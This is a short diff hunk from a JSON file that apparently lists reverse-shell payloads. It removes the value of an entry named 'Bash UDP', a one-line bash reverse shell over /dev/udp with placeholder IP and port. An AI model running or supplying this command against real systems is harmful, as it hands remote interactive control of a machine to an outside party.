@@ -1126,7 +1126,6 @@
                 },
                 {
                     "name": "Bash UDP",
-                    "value": "sh -i >& /dev/udp/§IP§/§PORT§ 0>&1",
                     "prompt": [
                         "IP",
                         "PORT"
